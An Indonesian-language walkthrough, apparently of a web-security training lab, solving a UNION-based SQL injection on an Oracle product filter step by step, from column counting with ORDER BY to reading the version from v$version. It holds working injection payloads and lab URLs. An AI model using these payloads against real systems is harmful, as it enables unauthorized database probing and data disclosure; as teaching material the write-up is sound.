# SQL injection attack, querying the database type and version on Oracle

![WhatsApp Image 2025-09-10 at 22 05 24_5bc65b9f](https://github.com/user-attachments/assets/ec9534fb-1a51-42e3-9cf3-191400d9dafc)

Aplikasi web ini rentan terhadap serangan SQL Injection berbasis UNION pada fungsionalitas filter kategori produknya. Kurangnya sanitasi pada input pengguna memungkinkan penyerang untuk memanipulasi query database dan menggabungkan hasil dari query yang dibuat oleh penyerang dengan hasil query asli.

- Tujuan: Menampilkan string versi dari database.
- Konteks: Serangan dilakukan melalui SQL injection pada filter kategori produk.
- Jenis Serangan: Serangan UNION, yang memungkinkan kita menggabungkan hasil dari query kita sendiri dengan query asli aplikasi.
- Database: Secara eksplisit disebutkan bahwa database-nya adalah Oracle.

Petunjuk Kunci (Hint):
- Di Oracle, setiap SELECT harus memiliki klausa FROM.
- bisa menggunakan tabel bawaan bernama dual jika kita tidak perlu mengambil data dari tabel nyata. Contoh: SELECT 'abc' FROM dual.
- Tabel Target: Untuk mendapatkan versi database Oracle, perlu melakukan query ke tabel (atau lebih tepatnya, view) sistem yang disebut v$version.

## Langkah-Langkah Pengerjaan

Langkah 1: Menentukan Jumlah Kolom

memastikan bahwa query SELECT memiliki jumlah kolom yang sama persis dengan query SELECT asli yang digunakan aplikasi. Cara paling umum untuk melakukannya adalah dengan menggunakan ORDER BY.

- Akses lab dan klik salah satu kategori, misalnya "Pets". URL akan menjadi :
```
https://0adb00390483ae48834bb93700ca0082.web-security-academy.net/filter?category=Pets
```
- menyuntikkan payload ORDER BY pada parameter category untuk menebak jumlah kolom.
- Coba dengan 1 kolom:
  - Payload: ' ORDER BY 1--
  - URL: .../filter?category=' ORDER BY 1--
  - Hasil: Halaman kemungkinan akan memuat dengan normal. Ini berarti query memiliki setidaknya 1 kolom.

<img width="1713" height="868" alt="image" src="https://github.com/user-attachments/assets/3524c844-21e5-451d-9906-f21003dd75b0" />

- Coba dengan 2 kolom:
  - Payload: ' ORDER BY 2--
  - URL: .../filter?category=' ORDER BY 2--
  - Hasil: Halaman kemungkinan besar masih akan memuat dengan normal. Ini berarti query memiliki setidaknya 2 kolom.

<img width="1625" height="851" alt="image" src="https://github.com/user-attachments/assets/1d5f80dd-3401-47ea-acbf-4f7f367b091e" />

- Coba dengan 3 kolom:
  - Payload: ' ORDER BY 3--
  - URL: .../filter?category=' ORDER BY 3--
  - Hasil: Halaman ini kemungkinan besar akan menampilkan pesan error atau tidak memuat konten. Ini menandakan bahwa query asli tidak memiliki 3 kolom.

<img width="1623" height="447" alt="image" src="https://github.com/user-attachments/assets/2a91253d-83c4-44ac-8523-3d9a64c71060" />

Langkah 2: Menentukan Tipe Data Kolom

Setelah tahu ada 2 kolom, sekarang perlu mencari tahu kolom mana yang bisa menampung data tipe string (seperti teks versi database). Kita bisa mengujinya dengan menyuntikkan UNION SELECT yang berisi string.
Kita akan menggunakan payload yang mencoba menempatkan string di kedua kolom. karena ini Oracle, kita harus menggunakan FROM dual.

- Payload Uji: ' UNION SELECT 'a','b' FROM dual--
  - ' : Menutup string 'Gifts'.
  - UNION SELECT 'a','b' : Query kita yang memiliki 2 kolom berisi string.
  - FROM dual : Sintaks wajib di Oracle.
  - -- : Mengomentari sisa query asli.
  - URL: .../filter?category=' UNION SELECT 'a','b' FROM dual--
  - Hasil: Halaman akan memuat dan  akan melihat teks "a" dan "b" muncul di antara nama-nama produk atau di tempat lain pada halaman. Ini mengonfirmasi bahwa kedua kolom tersebut bisa menerima data tipe string.
 
<img width="1077" height="67" alt="image" src="https://github.com/user-attachments/assets/e31ea4a4-a59b-4ca4-81b5-b3684235621c" />

<img width="1470" height="591" alt="image" src="https://github.com/user-attachments/assets/80f75890-e748-42e2-a09b-f169e7b42ffb" />

Langkah 3: Mengambil Versi Database

Sekarang kita tahu semua yang kita butuhkan untuk serangan akhir:
- Ada 2 kolom.
- Keduanya bisa menampung string.
- Kita perlu query ke v$version untuk mendapatkan versi.

1.perlu mengetahui nama kolom di v$version yang berisi informasi yang di inginkan. Dari cheat sheet SQL injection atau pengetahuan umum tentang Oracle, kolom yang relevan adalah BANNER.
2. Selanjutnya akan membangun payload akhir untuk mengambil data dari kolom BANNER. Disini akan metenempatkan BANNER di kolom pertama dan NULL di kolom kedua sebagai placeholder.
3. Payload Akhir: ' UNION SELECT BANNER, NULL FROM v$version--
4. URL: .../filter?category=' UNION SELECT BANNER, NULL FROM v$version--
5. Hasil:  Halaman akan memuat ulang, dan di antara konten halaman, akan melihat string versi lengkap dari database Oracle
6. Lab akan mendeteksi bahwa Anda telah berhasil menampilkan informasi ini dan akan menandainya sebagai "solved".

<img width="1272" height="60" alt="image" src="https://github.com/user-attachments/assets/cb6a6428-167b-4bb2-8a13-4dd7211b35c2" />

<img width="1650" height="837" alt="image" src="https://github.com/user-attachments/assets/50bb5307-fd79-43f8-aae7-e4a22d918367" />

## Dampak

Kerentanan ini memungkinkan Pengungkapan Informasi Sensitif (Sensitive Information Disclosure). Dengan kemampuan untuk mengekstrak versi database, penyerang dapat mencari kerentanan yang diketahui publik untuk versi spesifik tersebut, yang dapat memfasilitasi serangan lebih lanjut.
